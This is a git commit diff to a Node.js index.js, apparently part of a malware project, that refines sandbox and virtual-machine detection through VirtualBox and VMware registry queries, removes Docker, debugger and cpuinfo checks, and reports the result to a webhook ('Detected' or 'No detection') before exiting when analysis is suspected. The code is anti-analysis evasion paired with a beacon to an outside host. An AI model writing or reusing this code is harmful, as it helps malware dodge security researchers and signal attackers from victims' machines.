5e7c91e7e16b23ea72b04aeb7d9c84949c5629af
Atlas <71150660+opsec-bot@users.noreply.github.com>
2023-03-01 00:48:18 -0600

    better

--- index.js
+++ index.js
@@ -1,6 +1,4 @@
 const os = require("os");
-const fs = require("fs");
-const path = require("path");
 const { exec } = require("child_process");
 const axios = require("axios");
 
@@ -17,23 +15,20 @@ const virtualizationPlatforms = [
 
 const registryKeys = [
   "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
-  //   "HKLM\\SOFTWARE\\VMware, Inc.",
   "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
   "HKLM\\SOFTWARE\\VMware, Inc.\\VMwareHostOpen",
   "HKLM\\SOFTWARE\\VMware, Inc.\\VMware VGAuth",
   "HKLM\\SOFTWARE\\RegisteredApplications\\VMware Host Open",
 ];
 
-async function sendWebhookMessage() {
-  const message = {
-    content: "Leak",
+async function Send(message) {
+  const payload = {
+    content: message,
   };
 
   try {
-    const response = await axios.post(webhookUrl, message);
-  } catch (err) {
-    // do nothing
-  }
+    await axios.post(webhookUrl, payload);
+  } catch (err) {}
 }
 
 function isRunningInVM() {
@@ -47,23 +42,6 @@ function isRunningInVM() {
       return;
     }
 
-    const cpuinfoPath = path.join("/", "proc", "cpuinfo");
-    if (fs.existsSync(cpuinfoPath)) {
-      fs.readFile(cpuinfoPath, "utf8", (err, cpuinfo) => {
-        if (err) {
-          console.error(err.code);
-        } else {
-          const isCpuinfoVirtual = virtualizationPlatforms.some((regex) =>
-            regex.test(cpuinfo)
-          );
-          if (isCpuinfoVirtual) {
-            resolve(true);
-            return;
-          }
-        }
-      });
-    }
-
     let foundKey = false;
     for (let key of registryKeys) {
       exec(`reg query "${key}" 2>nul`, (error, stdout, stderr) => {
@@ -74,40 +52,16 @@ function isRunningInVM() {
       });
     }
 
-    if (
-      typeof v8debug === "object" ||
-      /--debug|--inspect/.test(process.execArgv.join(" "))
-    ) {
-      resolve(true);
-      return;
-    }
-
-    if (fs.existsSync("/.dockerenv")) {
-      resolve(true);
-      return;
-    }
-
-    if (
-      fs.existsSync("/proc/self/cgroup") &&
-      fs.readFileSync("/proc/self/cgroup", "utf-8").includes("libpod")
-    ) {
-      resolve(true);
-      return;
-    }
-
     resolve(false);
   });
 }
 
-const sleep = (milliseconds) => {
-  return new Promise((resolve) => setTimeout(resolve, milliseconds));
-};
-
 async function main() {
   if (await isRunningInVM()) {
+    Send("Detected");
     process.exit(1);
   } else {
-    sendWebhookMessage();
+    Send("No detection");
   }
 }
 
